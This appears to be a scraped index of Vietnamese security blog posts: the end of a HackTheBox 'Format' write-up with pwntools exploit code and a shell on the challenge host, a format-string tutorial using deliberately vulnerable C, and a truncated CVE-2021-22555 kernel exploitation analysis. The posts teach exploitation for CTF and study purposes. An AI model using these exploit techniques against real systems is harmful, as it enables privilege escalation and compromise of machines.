chúng ta đọc địa chỉ của printf: 1 2 ➜ Format git:(main) ✗ objdump -TR libc6_2.27-3ubuntu1_amd64.so| grep \u0026#34; printf$\u0026#34; 0000000000064e80 g DF .text 00000000000000c3 GLIBC_2.2.5 printf Chúng ta thấy rằng khoảng cách từ printf tới base address là 0x64e80, do đó, để tính base address, chúng ta lấy địa chỉ của printf leak được khi thực thi trừ đi 0x64e80.\nSau khi có được base address, chúng ta tính địa chỉ của malloc_hook_addr và one_gadget bằng cách lấy base address cộng với khoảng cách của các hàm (lấy bằng cách đọc static) 1 2 3 4 # Calculating base libc, __malloc_hook and one_gadget --- base_libc = printf_libc - 0x64e80 malloc_hook_addr = base_libc + 0x00000000003ebc30 one_gadget = base_libc + 0x4f322 Ta sử dụng pwnlib.fmtstr - công cụ khai thác lỗi format string để tính và ghi đè địa chỉ __malloc_hook với one gadget và kích hoạt nó. 1 2 3 4 5 6 # Overriding __malloc_hook with one_gadget --- p.sendline(fmtstr_payload(6, {malloc_hook_addr: one_gadget})) p.recv() p.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger p.interactive() p.close() Bước 4 - Chạy mã khai thác Chạy mã khai thác, ta có được 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 167.99.202.131 on port 32399: Done [+] LEAK : init+117 address: b\u0026#39;0x55afb922b26d\\n\u0026#39; [*] Base ELF address: 0x55afb922a000 [*] printf@got.plt address: 0x55afb922dfc0 [+] Leaked __printf: 0x7f6b96c3be80 exploit.py:65: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger [*] trigged malloc_hook [*] Switching to interactive mode $ ls flag.txt format run_challenge.sh $ cat flag.txt HTB{mall0c_h00k_f0r_th3_w1n!} $ [*] Interrupted [*] Closed connection to 167.99.202.131 port 32399 ➜ Format git:(main) ✗ Mã khai thác: exploit.py Nguồn tham khảo https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Format/notes.md ","description":"Can you hear the echo? ","id":9,"section":"posts","tags":["exploitation"],"title":"Hackthebox- Format","uri":"https://minhlongmt183.github.io/posts/htb_format/"},{"content":"Mở đầu Khai thác lỗi format string là một kĩ thuật cho phép chúng ta chiếm quyền kiểm soát của mộ chương trình đặc quyền. Giống như buffer overflow, format string cũng phụ thuộc vào lỗi khi lập trình, những lỗi này khi nhìn sơ qua thì không thấy có ảnh hưởng gì đến chương trình.\nNội dung chính Format Paraameters 1 function sử dụng định dạng chuỗi, như là prrintf(), chỉ cần xem xét định dạng được truyền vào nó và thực hiện những hoạt động đặc biệt mỗi khi gặp phải tham số truyền vào. Mỗi tham số định dạng chuỗi thì tương ứng với một tham số truyền vào, ví dụ chuỗi chúng ta sử dụng 4 tham số định dạng thì cần phải truyền 4 biến tương ưng. Những dạng định dạng tham số thường gặp: Parameter Input Type Output Type %d Value Decimal %u Value Unsigned decimal %x Value Hexadecimal %s Pointer String %n Pointer Number of bytes written so far Chúng ta sẽ thử với chương trình sau: fmt_uncommon.c\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int A = 5, B = 7, count_one, count_two; // Example of a %n format string printf(\u0026#34;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\u0026#34;, \u0026amp;count_one, \u0026amp;count_two); printf(\u0026#34;count_one: %d\\n\u0026#34;, count_one); printf(\u0026#34;count_two: %d\\n\u0026#34;, count_two); // Stack example printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); exit(0); } Chương trình sử dụng định dạng %n trong hàm printf(). Chúng ta chạy và xem output như thế nào. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ➜ fmt git:(main) ✗ gcc fmt_uncommon.c fmt_uncommon.c: In function ‘main’: fmt_uncommon.c:14:34: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 3 has type ‘int *’ [-Wformat=] 14 | printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); | ~~~^ ~~ | | | | unsigned int int * | %08ls ➜ fmt git:(main) ✗ ./a.out The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at c6658b68. B is 7. ➜ fmt git:(main) ✗ %n là định dạng duy nhất dùng để ghi dữ liệu thay vì hiển thị dữ liệu. Khi hàm định dạng gặp tham số %n, nó sẽ viết tổng số byte mà nó đã được viết bởi hàm vào địa chỉ tương ứng của biến. Ví dụ với hàm fmt_common trên, A có giá trị là 46 bởi vì tổng số byte mà hàm printf đã in ra cho tới khi gặp %n là 46 kí tự: 1 2 3 \u0026gt;\u0026gt;\u0026gt; la = \u0026#34;The number of bytes written up to this point X\u0026#34; \u0026gt;\u0026gt;\u0026gt; len(la) 46 Xem xét câu lệnh sau: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); Khi hàm printf() được gọi, các tham số được dưa vào stack theo thứ tự ngược lại: Top of the Stack Address of format string Value of A Address of A Value of B Bottom of the Stack Hàm printf sẽ đi qua từng kí tự một, nếu kí tự không bắt đầu bằng một format-parameter, kí tự này sẽ được copy ra output. Nếu một format-parameter được gặp, nó sẽ lấy giá trị của đối số trong stack tương ứng với parameter. Trong trường hợp số argeument trong stack ít hơn số format-parameter trong string thì điều gì sẽ xảy ra? Ví dụ: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); Ta sẽ tiến hành thay đổi 1 tí ở chương trình fmt_uncommon2.c 1 2 3 4 5 6 7 ➜ fmt git:(main) ✗ sed -e \u0026#39;s/, B)/)/\u0026#39; fmt_uncommon.c \u0026gt; fmt_uncommon2.c ➜ fmt git:(main) ✗ diff fmt_uncommon.c fmt_uncommon2.c 14c14 \u0026lt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); --- \u0026gt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); ➜ fmt git:(main) ✗ Compile và chạy, xem kết quả: 1 2 3 4 5 6 ➜ fmt git:(main) ✗ gcc -o fmt_uncommon2 fmt_uncommon2.c -w ➜ fmt git:(main) ✗ ./fmt_uncommon2 The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at 74f2e9b8. B is 0. Chúng ta dùng -w để tắt đi những warning từ compiler. Khi chạy, ta thấy B lúc bây giờ có giá trị là 0. Tại sao B lại có giá trị là 0 trong khi giá trị khởi tạo của B là 7? Ta đã biết rằng, khi hàm printf() gọi, nó sẽ đẩy các đối số vào trong stack và khi gặp format-parameter, nó sẽ vào stack và lấy giá trị này ra. Tuy nhiên, trong trường hợp này, số format-parameter lại nhiều hơn argument, nên đến tham số thứ 3, hàm printf cũng vào stack để lấy giá trị tại vị trí thứ 3 trên stack. 0 là giá trị đầu tiên mà hàm printf tìm thấy trên stack. The Format String Vulnerability Đôi khi programmer sử dụng printf(string) thay vì printf(\u0026quot;%s\u0026quot;, string). Lúc này, hàm printf sẽ nhận trực tiếp địa chỉ của string và in từng kí tự trong string đó. Đoạn code sau thể hiện hoạt động của 2 cách sử dụng này. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char text[1024]; static int test_val = -72; if (argc \u0026lt; 2) { printf(\u0026#34;Usage: %s \u0026lt;text to print\u0026gt;\\n\u0026#34;, argv[0]); exit(0); } strcpy(text. argv[1]); printf(\u0026#34;The right way to print user-controlled input:\\n\u0026#34;); printf(\u0026#34;%s\u0026#34;, text); printf(\u0026#34;\\n The wrong way to print user-controlled input:\\n\u0026#34;); printf(text); printf(\u0026#34;\\n\u0026#34;); // Debug output printf(\u0026#34;[*] test_val @ 0x%08x = %d 0x%08x\\n\u0026#34;, \u0026amp;test_val, test_val, test_val); exit(0); } Tiến hành biên dịch và xem kết quả: 1 2 3 4 5 6 7 ➜ fmt git:(main) ✗ gcc -o fmt_vuln fmt_vuln.c -w ➜ fmt git:(main) ✗ ./fmt_vuln hello_world The right way to print user-controlled input: hello_world The wrong way to print user-controlled input: hello_world [*] test_val @ 0x8a756010 = -72 0xffffffb8 Với input là hello_world, cả 2 cách đều hoạt động tốt. Tuy nhiên, nếu input nhập vào chứa format parameter liệu cả 2 có như nhau hay không? 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln hello_world%x The right way to print user-controlled input: hello_world%x The wrong way to print user-controlled input: hello_world128012a0 [*] test_val @ 0x10ff0010 = -72 0xffffffb8 Từ output trên ta thấy, với cách dùng thứ 2, giá trị trên stack đã được in ra. Với mỗi tham số %x được sủ dụng, 4 bytes trên stack sẽ được in ra. Do đó, nếu lặp lại quá trình này, chúng ta có thể lấy toàn bộ dữ liệu trên stack. 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln $(perl -e \u0026#39;print \u0026#34;%08x.\u0026#34;x40\u0026#39;) The right way to print user-controlled input: %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x. The wrong way to print user-controlled input: 925a72a0.00000000.946a01e7.00000030.000000c8.c2052148.947819a8.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.947a9700.c2051d60.945abab0.94781000.00000000.c2051de0.00000000.00000000. [*] test_val @ 0x92502010 = -72 0xffffffb8 Ta thấy dữ liệu trên stack đã được in ra theo từng nhóm 4 bytes, và 4 byte này theo thứ tự ngược do kiến trúc little-endian. Những bytes 0x25, 0x30, 0x38, 0x78, 0x2e dường như lặp lại nhiều lần. Cùng xem thử những byte này có giá trị là gì? 1 2 ➜ fmt git:(main) ✗ printf \u0026#34;\\x25\\x30\\x38\\x78\\x2e\\n\u0026#34; %08x. Như chúng ta có thể thấy, vùng nhớ này là giá trị của format-string. Vì hàm printf luôn nằm ở vị trí cao nhất trên stack frame và format-string có thể nằm ở bất kì đâu trên stack. Nó sẽ nằm dưới frame pointer hiện tại.\nReading from Arbitrary Memory Addresses Định dạng %s được dùng để đọc địa chỉ vùng nhớ bất kì. Vì nó có thể đọc dữ liệu của chuỗi định dạng ban đầu, một phần của chuỗi định dạng ban đầu có thể được sử dụng để cung cấp địa chỉ cho tham số định dạng %s, như được hiển thị ở đây: 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The right way to print user-controlled input: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The wrong way to print user-controlled input: AAAAff9a1a6c.f7d7068c.08049234.f7d7976c.f7f6f110.ff9a1aac.ff9a1f24.00000003.00000000.f7fa3000.41414141 [*] test_val @ 0x0804c02c = -72 0xffffffb8 4 bytes của 0x41 cho thấy tham số thứ 11 là dữ liệu bắt dầu của chuỗi chúng ta nhập vào. Nếu chúng ta thay format-parameter thứ 4 thành %s thay vì %x, hàm printf sẽ in ra chuỗi tại địa chỉ 0x41414141. Việc này sẽ làm crash chương trình vì 0x41414141 là một địa chỉ không hợp lệ. Nhưng, nếu địa chỉ này hợp lệ, thì ta có thể đọc được chuỗi tại địa chỉ này. Ta dùng một chương trình có tên là getenvaddr để lấy địa chỉ của biến môi trường PATH. ","description":"Khai thác format string là một kĩ thuật cho phép bạn chiếm quyền kiểm soát của một chương trình đặc quyền.... ","id":10,"section":"posts","tags":["exploitation"],"title":"Khai thác lỗi Format Strings","uri":"https://minhlongmt183.github.io/posts/format-string/"},{"content":"\rBài viết này nhằm mục đích học tập cá nhân, ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2021-22555: Turning \\x00\\x00 into 10000$, phần lớn là dịch từ bài viết gốc cộng thêm một số lí giải của tôi.\rTổng quan về lỗ hổng Lỗ hỗng cho phép viết dữ liệu bên ngoài vùng cho phép trên heap (heap out-of-bound) Những phiên bản bị ảnh hưởng: Linux kernel *v2.6.19-rc1 - v5.12-rc8 Môi trường thực thi, kiểm thử Ubuntu 20.04 Linux kernel: 5.8.0-48-gen Phân tích lỗ hổng Lỗ hổng được xác định nằm ở trong hàm xt_compat_target_from_user của /net/netfilter/x_tables.c: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr, unsigned int *size) { const struct xt_target *target = t-\u0026gt;u.kernel.target; struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t; int pad, off = xt_compat_target_offset(target); u_int16_t tsize = ct-\u0026gt;u.user.target_size; char name[sizeof(t-\u0026gt;u.user.name)]; t = *dstptr; memcpy(t, ct, sizeof(*ct)); if (target-\u0026gt;compat_from_user) target-\u0026gt;compat_from_user(t-\u0026gt;data, ct-\u0026gt;data); else memcpy(t-\u0026gt;data, ct-\u0026gt;data, tsize - sizeof(*ct)); pad = XT_ALIGN(target-\u0026gt;targetsize) - target-\u0026gt;targetsize; if (pad \u0026gt; 0) memset(t-\u0026gt;data + target-\u0026gt;targetsize, 0, pad); tsize += off; t-\u0026gt;u.user.target_size = tsize; strlcpy(name, target-\u0026gt;name, sizeof(name)); module_put(target-\u0026gt;me); strncpy(t-\u0026gt;u.user.name, name, sizeof(t-\u0026gt;u.user.name)); *size += off; *dstptr += tsize; } tại line 17-18 chương trình sao chép pad kí tự 0 vào vùng nhớ bắt đầu bằng t-\u0026gt;data + target-\u0026gt;targetsize. Trong trường hợp này, target-\u0026gt;targetsize không bị kiểm tra, do đó nó có thể chứa bất kì giá trị nào, kể cả giá trị âm. Chúng ta không thể kiểm soát được giá trị của target-\u0026gt;targetsize nhưng có thể sử dụng nhiều target với nhiều kích thước khác nhau bởi tên của chúng. Ví dụ như (TCPMSS, TTL, NFQUEUE) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 // net/netfilter/x_NFLOG.c static struct xt_target nflog_tg_reg __read_mostly = { .name = \u0026#34;NFLOG\u0026#34;, .revision = 0, .family = NFPROTO_UNSPEC, .checkentry = nflog_tg_check, .destroy = nflog_tg_destroy, .target = nflog_tg, .targetsize = sizeof(struct xt_nflog_info), .me = THIS_MODULE, }; // net/netfilter/x_NFQUEUE.c static struct xt_target nfqueue_tg_reg[] __read_mostly = { { .name = \u0026#34;NFQUEUE\u0026#34;, .family = NFPROTO_UNSPEC, .target = nfqueue_tg, .targetsize = sizeof(struct xt_NFQ_info), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 1, .family = NFPROTOR_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v1, .targetsize = sizeof(struct xt_NFQ_info_v1), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 3, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .targetsize = sizeof(struct xt_NFQ_info_v3), .me = THIS_MODULE, }, }; target size không được căn chỉnh 8 bytes để điền khi pad \u0026gt; 0, do đó, target size càng lớn thì offset càng lớn. target size có kích thước lớn nhất mà tác giả tìm được là NFLOG, với nó, chúng ta có thể chọn offset lên đến 0x4c out-of-bounds (chúng ta có thể thay đổi offset bằng cách thêm padding vào giữa 2 cấu trúc struct xt_entry_match và struct xt_entry_target): 1 2 3 4 5 6 7 8 9 struct xt_nflog_info{ /* \u0026#39;len\u0026#39; will be used iff you set XT_NFLOG_F_COPY_LEN in flags */ __u32 len; __u16 group; __u16 threshold; __u16 flags; __u16 pad; char prefix[64]; }; Bên cạnh đó, t-\u0026gt;data được cấp phát bởi hàm xt_alloc_table_info trong /net/netfilter/x_tables.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 struct xt_table_info *xt_alloc_table_info(unsigned int size) { struct xt_table_info *info = NULL; size_t sz = sizeof(*info) + size; if (sz \u0026lt; sizeof(*info) || sz \u0026gt;= XT_MAX_TABLE_SIZE) return NULL; info = kvmalloc(sz, GFP_KERNEL_ACCOUNT); if (!info) return NULL; memset(info, 0, sizeof(*info)); info-\u0026gt;size = size; return info; } Vùng nhớ được ghi cấp phát ở line 9 với flag GFP_KERNEL_ACCOUNT và kích thước là sz\nMặc dù vậy, kích thước tối thiểu \u0026gt; 0x100, có nghĩa kích thước nhỏ nhất của đối tượng có thể cấp phát là kmalloc-512. Chúng ta tìm đối tượng được cấp phát giữa kmalloc-512 và kmalloc-8192 để khai thác.\nTại sao biết 0x100? size là đối tượng chúng ta truyền vào, do đó, để biết cần trace xem hàm này được gọi ở đâu? Vì kích thước của struct xt_table_info = 0x100\rKích thước SIZE này chúng ta kiểm soát được bằng cách tìm xem hàm xt_alloc_table_info được gọi, ví dụ như hàm static int compat_do_replace(): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 static int compat_do_replace(struct net *net, void __user *user, unsigned int len) { int ret; struct compat_ipt_replace tmp; struct xt_table_info *newinfo; void *loc_cpu_entry; struct ipt_entry *iter; if (copy_from_user(\u0026amp;tmp, user, sizeof(tmp)) != 0) // size của tmp được xác địn bởi user return -EFAULT; /* overflow check */ if (tmp.num_counters \u0026gt;= INT_MAX / sizeof(struct xt_counters)) return -ENOMEM; if (tmp.num_counters == 0) return -EINVAL; tmp.name[sizeof(tmp.name)-1] = 0; newinfo = xt_alloc_table_info(tmp.size); // size của tmp được truyền vào ...... } Vì t-\u0026gt;data chúng ta có thể kiểm soát được thông qua size, nên bây giờ ta tìm cách đưa nó về cuối cùng của heap block. Ta xem xét hàm compat_copy_entry_from_user 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static void compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr, unsigned int *size, struct xt_table_info *newinfo, unsigned char *base) { struct xt_entry_target *t; struct ipt_entry *de; unsigned int origsize; int h; struct xt_entry_match *ematch; origsize = *size; de = *dstptr; memcpy(de, e, sizeof(struct ipt_entry)); memcpy(\u0026amp;de-\u0026gt;counters, \u0026amp;e-\u0026gt;counters, sizeof(e-\u0026gt;counters)); *dstptr += sizeof(struct ipt_entry); *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry); xt_ematch_foreach(ematch, e) xt_compat_match_from_user(ematch, dstptr, size); de-\u0026gt;target_offset = e-\u0026gt;target_offset - (origsize - *size); t = compat_ipt_get_target(e); xt_compat_target_from_user(t, dstptr, size); de-\u0026gt;next_offset = e-\u0026gt;next_offset - (origsize - *size); for (h = 0; h \u0026lt; NF_INET_NUMHOOKS; h++) { if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;hook_entry[h]) newinfo-\u0026gt;hook_entry[h] -= origsize - *size; if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;underflow[h]) newinfo-\u0026gt;underflow[h] -= origsize - *size; } } Chúng ta thấy tại line 15 dòng lệnh *dstptr += sizeof(struct ipt_entry); sẽ đẩy con trỏ t-\u0026gt;data về phía cuối của heap gần hơn. Sau đó, trong hàm xt_compat_match_from_user tại line 25, con trỏ dstptr tiếp tục được cộng *dstptr += msize làm cho t-\u0026gt;data thêm một lần nữa chạy gần về phía cuối heap hơn. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr, unsigned int *size) { const struct xt_match *match = m-\u0026gt;u.kernel.match; struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m; int pad, off = xt_compat_match_offset(match); u_int16_t msize = cm-\u0026gt;u.user.match_size; char name[sizeof(m-\u0026gt;u.user.name)]; m = *dstptr; memcpy(m, cm, sizeof(*cm)); if (match-\u0026gt;compat_from_user) match-\u0026gt;compat_from_user(m-\u0026gt;data, cm-\u0026gt;data); else memcpy(m-\u0026gt;data, cm-\u0026gt;data, msize - sizeof(*cm)); pad = XT_ALIGN(match-\u0026gt;matchsize) - match-\u0026gt;matchsize if (pad \u0026gt; 0) memset(m-\u0026gt;data + match-\u0026gt;matchsize, 0, pad); msize += off; m-\u0026gt;u.user.match_size = msize; strlcpy(name, match-\u0026gt;name, sizeof(name)); module_put(match-\u0026gt;me); strncpy(m-\u0026gt;u.user.name, name, sizeof(m-\u0026gt;u.user.name)); *size += off; *dstptr += msize; } và msize được kiểm soát bằng cách xây dựng cấu trúc dữ liệu ở tầng user. Do đó, chúng ta có một chiến lược, là kiểm soát msize -\u0026gt; dstptr-\u0026gt;t-\u0026gt;data về cuối cùng của heap block, sau đó kiểm soát target-\u0026gt;targetsize để ghi vào nội dung vào heap block tiếp theo.\nKhai thác lỗ hổng struct msg_msg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // include/linux/msg.h /* one msg_msg struct for each message */ struct msg_msg{ struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct *security; /* the actual message follows immediately */ }; // include/linux/types.h struct list_head { struct list_head *next, *prev; }; // ipc/msgutils.c struct msg_msgseg{ struct msg_msgseg *next; /* The next part of the message follow immediately*/ }; struct msg_msg được cấp phát bởi lời gọi hệ thống msgsnd trong ipc/msgutil.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 static struct msg_msg *alloc_msg(size_t len) { struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); if (msg == NULL) return NULL; msg-\u0026gt;next = NULL; msg-\u0026gt;security = NULL; len -= alen; pseg = \u0026amp;msg-\u0026gt;next; while (len \u0026gt; 0){ struct msg_msgseg *seg; cond_resched(); alen = min(len, DATALEN_SEG); seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); if (seg == NULL) goto out_err; *pseg = seg; pseg = \u0026amp;seg-\u0026gt;next; len -= alen; } return msg; out_err: free_msg(msg); return NULL; } len là kích thước dữ liệu của cấu trúc msg_msg.\nTạo ra UAF Nhiều message queues được tạo khi sử dụng msgget(). Sau đó, sử dụng msgsnd() để gửi message với kích thước 4096 cho mỗi message queue. Cuối cùng, sau khi gửi một số lượng lớn các messages, một số cấu trúc struct msg_msg trong message queue được cấp phát liên tục trên heap.\n. Sau đó, msgsnd để gửi một message có kích thước 1024 tới mỗi message queue. Message có kích thước 1024 sẽ xâu chuỗi với message kích thước 4096 và lưu trong thành phần struct list_head của struct msg_msg.\n. Khi gọi msgrcv để đọc các phần của 4096 message, nó sẽ giải phóng vùng nhớ mà cấu trúc msg_msg đã giữ trên heap.\n. Cuối cùng, khi gọi hàm xt_alloc_table_info để dùng cho những block 4096 trên heap thì nó đã bị giải phóng ở bước trước đó. Lí tưởng, chúng ta không nên giải phóng cấu trúc A ngày sau 4096 heap block để khi gọi xt_alloc_table_info chúng ta có thể sử dụng out-of-bounds để viết mã trỏ tới những byte cuối của cấu trúc struc msg_msg A m_list.next = 0.\n. Có một cơ hội rằng 2 4096 struct msg_msg cùng trỏ tới cung cấu trúc 1024 struct msg_msg B, nó sẽ tham khảo tới một cấu trúc 4096 struct msg_msg khác và UAF sẽ xuất hiện.\n. Để xác định cấu trúc struct msg_msg B có đang bị trỏ tới 2 lần hay không, ta gửi message có nội dung tương ứng với số thứ tự của message: ví dụ mesage 1 có nội dung là 1, message 2 có nội dung là 2, \u0026hellip;. message thứ 4096 có nội dung là 4096. Khi lỗi xảy ra, mỗi message của hàng đợi đều được đọc qua, nếu tính năng nào của cấu trúc B có nội dung không tương ứng với chỉ mục, có nghĩa nó không nằm trong hàng đợi, điều này cũng có nghĩa cấu trúc B đang tồn tại 2 struct trỏ tới nó. Bypass SMAP Đến đây, struct msg_msg B đang bị double referemced, cái thứ nhất giải phóng thằng B, và cái còn lại trò tới B chúng ta có thể kiểm soát được. Bây giờ chúng ta dùng hàm socketpair() để spray heap, spray lượng lớn các message với kích thước 1024 và tạo ra một fake struct struct msg_msg structure. lý tưởng chúng ta có thể phục hồi cấu trúc msg_msg B đã bị giải phóng.\nChú ý rằng mlist.next là 41414141 vì chúng ta không biết địa chỉ của kernel (khi SMAP được bật, chúng ta không thể tính ra địa chỉ cụ thể của user). Không có địa chỉ của kernel thì rất quan trọng vì nó làm chúng ta không thể giải phóng vùng nhớ 1 lần nữa. Nguyên nhân là trong khi hàm msgrcv(), message dược hủy liên kết khỏi hàng đợi là một danh sách vòng tròn. Một số trường của cấu trúc struct msg_msg cho phép chúng ta leak được những thông tin này. Cụ thể, trường m_ts được dùng để xác định lượng dữ liệu trả về cho userland: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/ipc/msgutil.c struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst) { struct msg_msgseg *dst_pseg, *src_pseg; size_t len = src-\u0026gt;m_ts; size_t alen; if (src-\u0026gt;m_ts \u0026gt; dst-\u0026gt;m_ts) return ERR_PTR(-EINVAL); alen = min(len, DATALEN_MSG); memcpy(dst + 1, src + 1, alen); ... return dst; } Kích thước ban đầu của message này là 1024-sizeof(struct msg_msg) bytes, chúng ta có thể tạo DATALEN_MSG=4096-xizeof(struct msg_msg). Do đó chúng ta có thể leak được thông tin từ header của struct msg_msg trong message kế tiếp. message queue được hiện thực nhưng 1 danh sách vòng tròn, do đó, mlist.next sẽ trỏ về message chính.\nKhi biết được địa chỉ của message chính, chúng ta có thể tạo lại fake strct msg_msg với đại chỉ là next (segment tiếp theo). Nội dung của message chính có thể được leak bằng cách đọc nhiều hơn DATALEN_MSG bytes. Địa chỉ của con trỏ mlist.next được leak từ message chính sẽ tiết lộ đại chỉ cảu message thứ 2, nó nằm kề cấu trúc struct msg_msg mà chung ta muốn làm giả. Lấy địa chỉ này từ đi 1024 chúng ta sẽ có được địa chỉ của message mà chúng ta muốn kiểm soát.\nvẫn chưa hiểu primary message là gì? trỏ như thế nào? Đọc kĩ hơn phần phân tích POC, flow thì sẽ hiểu rõ\rMột user-after-free tốt hơn. Tới đây chúng ta phải xây dựng được một cấu trúc giả struct msg_msg với địa chỉ leak được là mlist.next và mlist.prev (nghĩa là nó tự trỏ tới chính nó), bây giờ làm sao để fake message bị free trong hàng đợi fake message -queue. Khi sử dụng unix sockets, chúng ta có một đối tượng struct sk_buff trỏ tới fake message. Điều này có nghĩa khi chúng ta giải phóng tin nhắn giả của mình, tham thảo tới nó vẫn còn tồn ở đó.\ndữ liệu của vùng nhớ trên struct sk_buff là một chất liệu tuyệt vời để khai thác, vì nó không chưa thông tin tiêu đề nào, nghĩa là chúng ta có thể sử dụng nó để giải phóng bất kì đối tượng nào trên vùng nhớ này. Trong khi đó, nếu so sánh với kịch bản uaf thì chúng ta phải giải phóng đối tượng struct msg_msg, điều này chỉ được thực hiện nếu hai phần tử đầu tiên của con trỏ có thể ghi được Tìm đối tượng khai thác Đối tượng khai thác tốt nhất là đối tượng có con trỏ hàm trong cấu trúc này. Victim phải cấp phát với GFP_KERNEL_ACCOUNt\nCấu trúc struct pipe_buffer được cấp phát tròng kmalloc-1024 (đây là lí do tại sao mesage thứ 2 là 1024 bytes). Cấu trúc struct pipe_buffer có thể được cấp phát dễ dàng với pipe() mà có hàm alloc_pipe_info() như một chương trình con: 1 2 3 4 5 6 7 8 9 10 11 12 13 // https://git.kernel.org/pub/scm/linux/kernel/git/torvals/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct 